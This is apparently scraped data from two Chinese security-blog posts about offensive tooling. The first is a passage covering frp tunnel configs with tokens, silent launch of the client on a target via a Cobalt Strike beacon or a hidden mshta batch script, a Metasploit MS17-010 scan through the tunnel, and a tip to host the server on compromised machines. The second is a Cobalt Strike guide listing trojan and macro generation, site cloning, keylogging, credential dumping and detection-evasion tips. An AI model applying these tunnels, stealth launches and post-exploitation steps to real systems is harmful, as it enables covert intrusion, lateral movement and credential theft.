[VPS]4bind_addr = 0.0.0.05#frp服务器监听端口 [实战中可以用一些通透性较好的端口]6bind_port = 700778#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]9dashboard_port = 660910#服务端Web控制面板用户名与密码 [强口令]11dashboard_user = SuperMan12dashboard_pwd = WC3pvjmh2tt81314#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中15log_file = ./frps.log16#日志记录等级，有trace、debug、info、warn、error,通常情况下为info17log_level = info 18#日志保留时间19log_max_days = 32021#验证凭据，服务端和客户端的凭据必须一样才能连接22auth_token = E0iQEBOdoJeh23#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端] 24privilege_mode = true25#特权模式Token [强口令，建议随机生成]26privilege_token = kukezkHC8R1H27#特权模式允许分配的端口 [避免端口被滥用] 28privilege_allow_ports = 4000-500002930#心跳检测超时时长 31heartbeat_timeout = 303233#每个代理可以设置的连接池上限34max_pool_count = 203536#口令认证超时时间，一般不用改37authentication_timeout = 9003839#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析] 40subdomain_host = xxxx.online客户端1#通用配置段2[common]3#frp服务端IP或域名 [实战中一般都会直接用域名] 4server_addr = frp.xxxx.online5#frp服务器端口6server_port = 700778#授权token，此处必须与服务端保持一致，否则无法建立连接 9auth_token = E0iQEBOdoJeh10#启用特权模式 [特权模式下服务端无需配置] 11privilege_mode = true12#特权模式 token,同样要与服务端完全保持一致 13privilege_token = kukezkHC8R1H1415#心跳检查间隔与超时时间16heartbeat_interval = 10 17heartbeat_timeout = 301819#连接数量 20pool_count = 202122#内网穿透通常用socks523[socks5]24type = tcp25#连接VPS内网穿透的远程连接端口26remote_port = 906627#使用插件socks5代理28plugin = socks529#启用加密 [通信内容加密传输，有效防止流量被拦截]30use_encryption = true31#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]32use_compression = true33#socks5连接口令 [根据实际情况进行配置]34#plugin_user = SuperMan35#plugin_passwd = ZBO0McQe6mE1执行部署服务端SSH连接到VPS上，后台启动frp服务端。1root@Ubuntu:~# cd tools/frp/2root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;3root@Ubuntu:~/tools/frp# jobs -l4root@Ubuntu:~/tools/frp# cat frps.log客户端将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到。但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序。1beacon&gt; sleep 102beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.ini3beacon&gt; shell netstat -ano |findstr 7007或者，创建后台运行的bat脚本。1@echo off 2if \"%1\" == \"h\" goto begin 3mshta vbscript:createobject(\"wscript.shell\").run(\"%~nx0 h\",0)(window.close)&amp;&amp;exit 4:begin 5c:\\frpc.exe -c c:\\frpc.ini工具穿透Metasploit当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。 [若socks5设置口令，可结合proxychains]1# sudo msfconsole -q2msf5 &gt; setg proxies socks5:frp.xxxx.online:90663msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_0104msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 105msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.1786msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; runWindowsWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。小结Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike基本功能与使用","slug":"CobaltStrike基本功能与使用","date":"2019-12-04T10:47:29.000Z","updated":"2020-07-03T16:45:25.983Z","comments":true,"path":"2019/1204/cobaltstrike-basic-function-and-use.html","link":"","permalink":"https://payloads.cn/2019/1204/cobaltstrike-basic-function-and-use.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等。Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。基本功能安装Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。服务端服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：1chmod +x teamserver2./teamserver 10.11.42.202 test123 3# 服务端真实IP(不能使用0.0.0.0或127.0.0.1)和连接密码客户端客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。参数详情Cobalt Strike1New Connection #新的连接(支持连接多个服务器端)2Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)3Visualization #窗口视图模式(展示输出结果的形式)4VPN Interfaces #VPN接入5Listenrs #监听器(创建Listener)6Script Manager #脚本管理7Close #关闭View1Applications #应用(显示受害者机器的应用信息)2Credentials #凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)3Downloads #下载文件4Event Log #事件日志(主机上线记录以及团队协作聊天记录)5Keystrokes #键盘记录6Proxy Pivots #代理模块7Screenshots #截图8Script Console #脚本控制台(可以加载各种脚本，增强功能https://github.com/rsmudge/cortana-scripts)9Targets #显示目标主机10Web Log #Web日志AttacksPackages1HTML Application #生成恶意的HTA木马文件2MS Office Macro #生成office宏病毒文件3Payload Generator #生成各种语言版本的payload4USB/CD AutoPlay #生成利用自动播放运行的木马文件5Windows Dropper #捆绑器，能够对文档类进行捆绑6Windows Executable #生成可执行Payload7Windows Executable(S) #把包含payload,Stageless生成可执行文件(包含多数功能)Web Drive-by1Manage #对开启的web服务进行管理2Clone Site #克隆网站(可记录受害者提交的数据)3Host File #提供Web以供下载某文件4Scripted Web Delivery #提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery 5Signed Applet Attack #启动一个Web服务以提供自签名Java Applet的运行环境6Smart Applet Attack #自动检测Java版本并利用已知的exploits绕过security7System Profiler #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等Reporting10. Activity report #活动报告21. Hosts report #主机报告32. Indicators of Compromise #威胁报告43. Sessions report #会话报告54. Social engineering report #社会工程学报告65. Tactics, Techniques, and Procedures #策略、技巧和程序 7Reset Data #重置数据8Export Data #导出数据Help1Homepage #官方主页2Support #技术支持3Arsenal #开发者4System information #版本信息5About #关于右键菜单Access1Dump Hashes #获取hash2Elevate #提权3Golden Ticket #生成黄金票据注入当前会话4Make token #凭证转换5Run Mimikatz #运行 Mimikatz 6Spawn As #用其他用户生成Cobalt Strike侦听器Explore1Browser Pivot #劫持目标浏览器进程2Desktop(VNC) #桌面交互3File Browser #文件浏览器4Net View #命令Net View5Port Scan #端口扫描6Process List #进程列表7Screenshot #截图Pivoting1SOCKS Server #代理服务2Listener #反向端口转发3Deploy VPN #部署VPNSpawn外部监听器(如指派给MSF，获取meterpreter权限)Session1Note #备注2Remove #删除3Sleep #指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。4Exit #退出Interact(打开beacon)1beacon&gt; help23Beacon Commands4===============56Command Description7------- -----------8argue 进程参数欺骗9blockdlls 阻止子进程加载非Microsoft DLL10browserpivot 注入受害者浏览器进程11bypassuac 绕过UAC提升权限12cancel 取消正在进行的下载13cd 切换目录14checkin 强制让被控端回连一次15clear 清除beacon内部的任务队列16connect Connect to a Beacon peer over TCP17covertvpn 部署Covert VPN客户端18cp 复制文件19dcsync 从DC中提取密码哈希20desktop 远程桌面(VNC)21dllinject 反射DLL注入进程22dllload 使用LoadLibrary将DLL加载到进程中23download 下载文件24downloads 列出正在进行的文件下载25drives 列出目标盘符26elevate 使用exp27execute 在目标上执行程序(无输出)28execute-assembly 在目标上内存中执行本地.NET程序29exit 终止beacon会话30getprivs Enable system privileges on current token31getsystem 尝试获取SYSTEM权限32getuid 获取用户ID33hashdump 转储密码哈希值34help 帮助35inject 在注入进程生成会话36jobkill 结束一个后台任务37jobs 列出后台任务38kerberos_ccache_use 从ccache文件中导入票据应用于此会话39kerberos_ticket_purge 清除当前会话的票据40kerberos_ticket_use Apply 从ticket文件中导入票据应用于此会话41keylogger 键盘记录42kill 结束进程43link Connect to a Beacon peer over a named pipe44logonpasswords 使用mimikatz转储凭据和哈希值45ls 列出文件46make_token 创建令牌以传递凭据47mimikatz 运行mimikatz48mkdir 创建一个目录49mode dns 使用DNS A作为通信通道(仅限DNS beacon)50mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)51mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)52mode http 使用HTTP作为通信通道53mv 移动文件54net net命令55note 备注 56portscan 进行端口扫描57powerpick 通过Unmanaged PowerShell执行命令58powershell 通过powershell.exe执行命令59powershell-import 导入powershell脚本60ppid Set parent PID for spawned post-ex jobs61ps 显示进程列表62psexec Use a service to spawn a session on a host63psexec_psh Use PowerShell to spawn a session on a host64psinject 在特定进程中执行PowerShell命令65pth 使用Mimikatz进行传递哈希66pwd 当前目录位置67reg Query the registry68rev2self 恢复原始令牌69rm 删除文件或文件夹70rportfwd 端口转发71run 在目标上执行程序(返回输出)72runas 以其他用户权限执行程序73runasadmin 在高权限下执行程序74runu Execute a program under another PID75screenshot 屏幕截图76setenv 设置环境变量77shell 执行cmd命令78shinject 将shellcode注入进程79shspawn 启动一个进程并将shellcode注入其中80sleep 设置睡眠延迟时间81socks 启动SOCKS4代理82socks stop 停止SOCKS483spawn Spawn a session 84spawnas Spawn a session as another user85spawnto Set executable to spawn processes into86spawnu Spawn a session under another PID87ssh 使用ssh连接远程主机88ssh-key 使用密钥连接远程主机89steal_token 从进程中窃取令牌90timestomp 将一个文件的时间戳应用到另一个文件91unlink Disconnect from parent Beacon92upload 上传文件93wdigest 使用mimikatz转储明文凭据94winrm 使用WinRM横向渗透95wmi 使用WMI横向渗透使用Listeners简介在本版本Cobalt Strike 3.14中，提供了如图9种 Listener (监听器)。1windows&#x2F;beacon_dns&#x2F;reverse_dns_txt2windows&#x2F;beacon_dns&#x2F;reverse_http3windows&#x2F;beacon_http&#x2F;reverse_http4windows&#x2F;beacon_https&#x2F;reverse_https5windows&#x2F;beacon_smb&#x2F;bind_pipe6windows&#x2F;beacon_tcp&#x2F;bind_tcp7windows&#x2F;foreign&#x2F;reverse_http8windows&#x2F;foreign&#x2F;reverse_https9windows&#x2F;foreign&#x2F;reverse_tcp (3.13版后增加，支持linuxSSH会话)beacon_xx 系列为Cobalt Strike自身，包括 dns、http、https、smb 四种方式的监听器。foreign 系列为外部监听器，通常与MSF或者Armitage联动。在Cobalt Strike 3.13版本后增加了一个新的 Listeners (windows/beacon_tcp/bind_tcp) ，它支持linuxSSH会话。具体更新内容可以查阅 官网 。创建一个服务首先配置一个监听器选择 Attacks &gt; Packages &gt; Windows Executable上线成功，在 Event Log 处出现上线信息。Beacon右键目标interact来使用Beacon，用它来执行各种命令。在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显，在这里设置sleep 10。同时在beacon中，如果想对目标进行命令管理，需要在前面加上shell，如shell whoami、shell ipconfig等。总结这里只是简单描述CobaltStrike的用法，其中还有很多功能的使用，需要实际操作中去发现。更核心的地方在于理解CobaltStrike的Beacon在内网中的通信过程，这对于渗透者能否更进一步深入内网起到重要作用，也是神器的价值所在。在渗透过程中，不要仅限于单一模式的思路，根据实际的情况，选择更优的方法来进行下一步的渗透测试。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]}]}